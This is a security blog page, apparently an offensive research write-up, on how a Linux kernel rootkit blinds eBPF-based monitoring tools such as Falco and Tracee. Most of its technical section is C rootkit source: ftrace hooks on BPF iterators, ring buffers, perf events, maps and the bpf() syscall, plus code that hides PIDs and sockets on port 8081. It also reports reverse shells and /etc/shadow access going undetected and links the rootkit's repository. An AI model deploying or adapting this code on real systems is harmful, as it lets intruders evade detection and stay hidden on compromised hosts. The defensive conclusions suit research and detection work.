<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools | 0xMatheuZ</title>
<meta name="keywords" content="eBPF, Kernel Security, Evasion">
<meta name="description" content="Deep technical analysis of bypassing eBPF-based security solutions through kernel-level hooks targeting BPF iterators, ringbuffers, and perf events">
<meta name="author" content="0xMatheuZ">
<link rel="canonical" href="http://localhost:1313/hacking/ebpf-security-tools-hacking/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/ebpf-security-tools-hacking/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools" />
<meta property="og:description" content="Deep technical analysis of bypassing eBPF-based security solutions through kernel-level hooks targeting BPF iterators, ringbuffers, and perf events" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/hacking/ebpf-security-tools-hacking/" /><meta property="og:image" content="https://i.imgur.com/RtaoVy1.jpeg" /><meta property="article:section" content="hacking" />

<meta property="og:site_name" content="0xMatheuZ" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://i.imgur.com/RtaoVy1.jpeg"/>

<meta name="twitter:title" content="Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"/>
<meta name="twitter:description" content="Deep technical analysis of bypassing eBPF-based security solutions through kernel-level hooks targeting BPF iterators, ringbuffers, and perf events"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Hackings",
      "item": "http://localhost:1313/hacking/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools",
      "item": "http://localhost:1313/hacking/ebpf-security-tools-hacking/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools",
  "name": "Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools",
  "description": "Deep technical analysis of bypassing eBPF-based security solutions through kernel-level hooks targeting BPF iterators, ringbuffers, and perf events",
  "keywords": [
    "eBPF", "Kernel Security", "Evasion"
  ],
  "articleBody": "Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel’s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let’s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u003e bpf_iter_run_prog() -\u003e eBPF iterator program -\u003e bpf_seq_write() / bpf_seq_printf() -\u003e Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u003e eBPF program -\u003e bpf_ringbuf_reserve() -\u003e bpf_ringbuf_submit() or bpf_ringbuf_output() -\u003e Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: “Perf event arrays” and “BPF ring buffers” are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u003e eBPF program -\u003e perf_event_output() -\u003e perf_trace_run_bpf_submit() -\u003e Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u003e bpf_map_lookup_elem() -\u003e bpf_map_update_elem() -\u003e bpf_map_delete_elem() -\u003e Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let’s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\"bpf_iter_run_prog\", hook_bpf_iter_run_prog, \u0026orig_bpf_iter_run_prog), HOOK(\"bpf_seq_write\", hook_bpf_seq_write, \u0026orig_bpf_seq_write), HOOK(\"bpf_seq_printf\", hook_bpf_seq_printf, \u0026orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\"bpf_ringbuf_output\", hook_bpf_ringbuf_output, \u0026orig_bpf_ringbuf_output), HOOK(\"bpf_ringbuf_reserve\", hook_bpf_ringbuf_reserve, \u0026orig_bpf_ringbuf_reserve), HOOK(\"bpf_ringbuf_submit\", hook_bpf_ringbuf_submit, \u0026orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\"bpf_map_lookup_elem\", hook_bpf_map_lookup_elem, \u0026orig_bpf_map_lookup_elem), HOOK(\"bpf_map_update_elem\", hook_bpf_map_update_elem, \u0026orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\"perf_event_output\", hook_perf_event_output, \u0026orig_perf_event_output), HOOK(\"perf_trace_run_bpf_submit\", hook_perf_trace_run_bpf_submit, \u0026orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\"__bpf_prog_run\", hook_bpf_prog_run, \u0026orig_bpf_prog_run), // BPF Syscall HOOK(\"__x64_sys_bpf\", hook_bpf, \u0026orig_bpf), HOOK(\"__ia32_sys_bpf\", hook_bpf_ia32, \u0026orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We’re not fighting eBPF, we’re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u003c hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u003c MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u003c hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u003c= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026\u0026 depth \u003c max_depth) { if (parent-\u003epid \u003c= 0) break; parent = rcu_dereference(parent-\u003ereal_parent); if (!parent || parent-\u003epid \u003c= 1) break; if (should_hide_pid_by_int(parent-\u003epid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u003eskc_family == AF_INET) { sport = sk-\u003eskc_num; dport = sk-\u003eskc_dport; saddr = sk-\u003eskc_rcv_saddr; daddr = sk-\u003eskc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u003eskc_family == AF_INET6) { sport = sk-\u003eskc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026\u0026 tcp_ctx-\u003esk_common) { sk = tcp_ctx-\u003esk_common; if ((unsigned long)sk \u003e PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026\u0026 udp_ctx-\u003eudp_sk) { udp_sk = udp_ctx-\u003eudp_sk; if ((unsigned long)udp_sk \u003e PAGE_SIZE) { sk = \u0026udp_sk-\u003einet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026\u0026 task_ctx-\u003etask) { task = task_ctx-\u003etask; if ((unsigned long)task \u003e PAGE_SIZE \u0026\u0026 task-\u003epid \u003e 0) { if (is_child_of_hidden_process(task-\u003epid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it’s seeing the complete system state, but we’ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u003c sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u003c (len / sizeof(u32)) \u0026\u0026 i \u003c 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u003e 0 \u0026\u0026 potential_pid \u003c 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u003c sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u003etype \u003e= 1 \u0026\u0026 hdr-\u003etype \u003c= 400 \u0026\u0026 hdr-\u003elen \u003e 0 \u0026\u0026 hdr-\u003elen \u003c 65536 \u0026\u0026 hdr-\u003enparams \u003c 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u003etid \u0026 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u003etgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u003etid \u0026 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco’s perspective, these processes simply don’t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u003etgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026\u0026 is_child_of_hidden_process(task-\u003epid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u003etgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026\u0026 map \u0026\u0026 map-\u003ekey_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn't exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026\u0026 map-\u003ekey_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool’s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u003etgid; // Don't execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u003edi; pid = current-\u003etgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit’s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco’s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco’s userspace agent. From Falco’s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It’s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee’s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel’s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nMy Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can “run correctly” while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system’s “ground truth” is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can’t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you’re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n",
  "wordCount" : "3362",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "0xMatheuZ"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/hacking/ebpf-security-tools-hacking/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "0xMatheuZ",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="MatheuZ (Alt + H)">
                <img src="https://i.imgur.com/xeSd64L.png" alt="" aria-label="logo"
                    height="25">MatheuZ</a>
            <div class="logo-switches">
                <ul class="lang-switch"><li>|</li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/hacking" title="hacking">
                    <span>hacking</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
    <h1 class="post-title entry-hint-parent">
      Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools
    </h1>
    <div class="post-description">
      Deep technical analysis of bypassing eBPF-based security solutions through kernel-level hooks targeting BPF iterators, ringbuffers, and perf events
    </div>
    <div class="post-meta">16 min&nbsp;·&nbsp;0xMatheuZ

</div>
  </header> 
  <div class="post-content"><p>Stealthy Kernel Rootkit: <a href="https://github.com/MatheuZSecurity/Singularity">https://github.com/MatheuZSecurity/Singularity</a></p>
<p>Rootkit Researchers: <a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></p>
<p>Me: <a href="https://www.linkedin.com/in/mathsalves/">https://www.linkedin.com/in/mathsalves/</a></p>
<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
<p>Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that&rsquo;s difficult to evade from user space.</p>
<p>But that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.</p>
<p>This article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren&rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.</p>
<p>All research is strictly for educational purposes.</p>
<h1 id="table-of-contents">Table of Contents<a hidden class="anchor" aria-hidden="true" href="#table-of-contents">#</a></h1>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#the-ebpf-security-landscape">The eBPF Security Landscape</a>
<ul>
<li><a href="#how-ebpf-security-works">How eBPF Security Works</a></li>
<li><a href="#the-false-promise-of-kernel-observability">The False Promise of Kernel Observability</a></li>
</ul>
</li>
<li><a href="#understanding-the-attack-surface">Understanding the Attack Surface</a>
<ul>
<li><a href="#bpf-iterators">BPF Iterators</a></li>
<li><a href="#bpf-ringbuffers">BPF Ringbuffers</a></li>
<li><a href="#perf-events">Perf Events</a></li>
<li><a href="#bpf-maps">BPF Maps</a></li>
</ul>
</li>
<li><a href="#bypassing-ebpf-security-technical-implementation">Bypassing eBPF Security: Technical Implementation</a>
<ul>
<li><a href="#hook-architecture">Hook Architecture</a></li>
<li><a href="#process-and-network-hiding">Process and Network Hiding</a></li>
<li><a href="#intercepting-bpf-iterators">Intercepting BPF Iterators</a></li>
<li><a href="#filtering-ringbuffer-events">Filtering Ringbuffer Events</a></li>
<li><a href="#blocking-perf-event-submission">Blocking Perf Event Submission</a></li>
<li><a href="#manipulating-bpf-maps">Manipulating BPF Maps</a></li>
</ul>
</li>
<li><a href="#real-world-bypass-results">Real-World Bypass Results</a>
<ul>
<li><a href="#falco-evasion">Falco Evasion</a></li>
<li><a href="#tracee-evasion">Tracee Evasion</a></li>
<li><a href="#additional-tools">Additional Tools</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
